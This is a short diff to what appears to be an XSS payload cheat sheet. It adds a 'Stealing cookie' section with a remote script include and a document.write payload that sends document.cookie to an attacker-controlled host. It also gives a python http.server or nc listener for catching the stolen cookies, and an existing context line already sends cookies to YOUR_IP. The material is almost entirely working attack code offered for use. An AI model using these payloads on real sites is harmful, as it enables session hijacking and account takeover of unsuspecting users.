@@ -23,6 +23,13 @@ XSS Payloads
 <script>new Image().src='http://YOUR_IP/index.php?c='+document.cookie</script> 	Send Cookie details to us
 
 
+Stealing cookie
+<script src="http://your_ip/xss.js"> // where xss.js file have payload that is below 
+document.write('<img src="http://your_ip/?'+document.cookie+'">'); //into file
+python3 -m http.server 80 // on your machine or 
+nc -lvnp 80
+
+
 
 
 
